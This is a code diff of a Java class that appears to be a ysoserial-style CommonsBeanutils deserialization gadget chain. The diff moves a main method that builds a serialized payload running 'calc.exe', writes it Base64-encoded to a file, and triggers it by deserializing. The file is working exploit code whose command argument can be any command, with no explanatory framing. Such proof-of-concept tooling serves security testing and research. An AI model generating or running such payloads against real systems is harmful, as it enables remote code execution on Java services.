@@ -10,6 +10,14 @@ import java.util.PriorityQueue;
 
 @SuppressWarnings("all")
 public class CB {
+    public static void main(String[] args) throws Exception {
+        CB c = new CB();
+        Object obj = c.getObject("calc.exe");
+        String base64 = Base64.getEncoder().encodeToString(SerUtil.serializeObject(obj));
+        Files.write(Paths.get("test.txt"), base64.getBytes());
+        SerUtil.deserializeObject(SerUtil.serializeObject(obj));
+    }
+
     public Object getObject(final String command) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(command);
         // mock method name until armed
@@ -30,13 +38,5 @@ public class CB {
         queueArray[1] = templates;
 
         return queue;
-    }
-
-    public static void main(String[] args) throws Exception {
-        CB c = new CB();
-        Object obj = c.getObject("calc.exe");
-        String base64 = Base64.getEncoder().encodeToString(SerUtil.serializeObject(obj));
-        Files.write(Paths.get("test.txt"),base64.getBytes());
-        SerUtil.deserializeObject(SerUtil.serializeObject(obj));
     }
 }
